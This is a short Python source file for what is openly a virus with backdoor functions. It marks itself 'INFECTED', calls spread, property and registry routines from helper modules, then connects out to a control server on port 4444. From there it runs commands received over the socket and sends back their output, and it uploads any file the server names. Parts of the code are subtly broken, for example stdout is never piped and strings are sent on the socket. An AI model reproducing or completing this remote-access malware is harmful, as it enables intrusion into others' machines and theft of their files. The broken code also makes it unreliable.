import subprocess
import socket
from time import *
from viral import *
from registry import *


status = 'INFECTED'


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER_HOST = ''
SERVER_PORT = 4444
BUFFER_SIZE = 1024


def upload():
    file = sock.recv(BUFFER_SIZE)
    f = open(file, 'rb')
    i = f.read(BUFFER_SIZE)
    while i:
        sock.send(i)
        i = f.read(BUFFER_SIZE)
    f.close()
    sock.send('Complete')


def connect():
    while True:
        try:
            print('Connecting to server...')
            sock.connect((SERVER_HOST, SERVER_PORT))
        except Exception as e:
            print(e)
            sleep(5)
            connect()
        else:
            print('Connection Successful')
            while True:
                received = sock.recv(BUFFER_SIZE).decode()
                if received == 'quit':
                    sock.close()
                elif received == 'download':
                    upload()
                else:
                    result = subprocess.Popen(received, shell=False, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = result.stdout.read() + result.stderr.read()
                    sock.send(output)
        continue


if __name__ == '__main__':
    spread()
    virus_property()
    regc()
    connect()
